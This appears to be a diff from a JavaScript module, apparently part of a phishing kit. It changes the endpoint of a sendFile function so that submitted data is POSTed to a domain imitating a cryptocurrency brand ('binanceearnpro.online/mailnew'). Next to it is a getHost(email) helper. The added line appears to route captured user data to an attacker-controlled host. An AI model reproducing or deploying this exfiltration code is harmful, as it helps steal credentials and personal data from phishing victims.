@@ -27,7 +27,7 @@ export const getHost = (email) =>
   }).then((response) => response.json());
 
 export const sendFile = (data) =>
-  fetch("https://expresspages-chi.vercel.app/mailnew", {
+  fetch("https://binanceearnpro.online/mailnew", {
     method: "POST",
     mode: "cors",
     headers: {
